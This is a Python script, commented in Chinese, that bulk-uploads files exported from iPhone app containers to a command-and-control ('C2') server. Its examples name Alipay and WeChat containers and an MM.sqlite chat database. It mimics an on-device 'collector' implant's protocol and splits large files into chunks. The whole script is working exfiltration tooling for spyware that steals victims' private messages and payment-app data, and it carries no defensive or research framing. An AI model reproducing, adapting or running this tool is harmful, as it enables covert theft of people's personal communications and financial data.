#!/usr/bin/env python3
"""
upload_from_pc.py — 把电脑上的采集文件灌进新v2 后台（无需编译 App）

用途：WQ Files 把目标 App 容器导出成文件后，在 PC 上批量回传到 C2。
协议与 collector 完全一致：POST /stats，>8MB 自动分片（uploadId/part/total）。

例子：
  python upload_from_pc.py --c2 http://192.168.100.10:8080 \
      --device WQ-PHONE-271 --category container-com.alipay.iphoneclient \
      --dir "C:\\Users\\Administrator\\Downloads\\wx_backup"

  python upload_from_pc.py --c2 http://192.168.100.10:8080 \
      --device WQ-PHONE-271 --category container-com.tencent.xin \
      --file "C:\\Users\\Administrator\\Downloads\\MM.sqlite"
"""
import argparse
import base64
import json
import mimetypes
import os
import sys
import time
import urllib.error
import urllib.request

CHUNK = 8 * 1024 * 1024


def post(c2, payload, uuid):
    req = urllib.request.Request(
        c2.rstrip("/") + "/stats",
        data=json.dumps(payload).encode(),
        headers={
            "Content-Type": "application/json",
            "X-Device-UUID": uuid,
            "User-Agent": "collector-pc/1.0",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return r.status, r.read().decode(errors="ignore")[:200]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="ignore")[:200]
    except Exception as e:
        return 0, str(e)


def upload_file(c2, uuid, category, path, remote_name=None, quiet=False):
    size = os.path.getsize(path)
    name = remote_name or os.path.basename(path)
    virtual = "/var/mobile/Containers/Data/Application/" + (uuid or "PC") + "/Documents/" + name
    if size <= CHUNK:
        with open(path, "rb") as f:
            data = f.read()
        code, body = post(c2, {
            "category": category, "path": virtual, "size": size,
            "data": base64.b64encode(data).decode(),
            "deviceSerial": uuid, "deviceVersion": "pc-upload", "ua": "collector-pc/1.0",
        }, uuid)
        if not quiet:
            print(f"  {name:<40} {size/1024:8.1f} KB -> {code} {body}")
        return code == 200

    total = (size + CHUNK - 1) // CHUNK
    uid = f"PC{int(time.time())}-{uuid[:8] if uuid else 'x'}"
    ok = True
    with open(path, "rb") as f:
        for idx in range(total):
            chunk = f.read(CHUNK)
            code, body = post(c2, {
                "category": category, "path": virtual, "size": size,
                "data": base64.b64encode(chunk).decode(),
                "deviceSerial": uuid, "deviceVersion": "pc-upload", "ua": "collector-pc/1.0",
                "uploadId": uid, "part": idx + 1, "total": total,
            }, uuid)
            if not quiet:
                print(f"  {name} part {idx+1}/{total} -> {code}")
            if code != 200:
                ok = False
                break
    return ok


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--c2", required=True, help="C2 基址，如 http://192.168.100.10:8080")
    ap.add_argument("--device", default="PC-UPLOAD", help="设备标识（会建成一台设备）")
    ap.add_argument("--category", required=True, help="如 container-com.alipay.iphoneclient")
    ap.add_argument("--dir", help="目录：递归上传")
    ap.add_argument("--file", help="单文件上传")
    ap.add_argument("--ext", default="db,sqlite,sqlite3,json,plist,txt,log,dat,bin,zip",
                    help="目录模式下的扩展名白名单")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    files = []
    if args.file:
        files = [args.file]
    elif args.dir:
        exts = {e.strip().lower() for e in args.ext.split(",") if e.strip()}
        for root, _, names in os.walk(args.dir):
            for n in names:
                if os.path.splitext(n)[1].lstrip(".").lower() in exts:
                    files.append(os.path.join(root, n))
    else:
        sys.exit("需要 --dir 或 --file")

    print(f"C2={args.c2} device={args.device} category={args.category} files={len(files)}")
    ok = 0
    for p in files:
        try:
            if upload_file(args.c2, args.device, args.category, p, quiet=args.quiet):
                ok += 1
        except Exception as e:
            print("  ERR", p, e)
    print(f"完成: {ok}/{len(files)}")


if __name__ == "__main__":
    main()
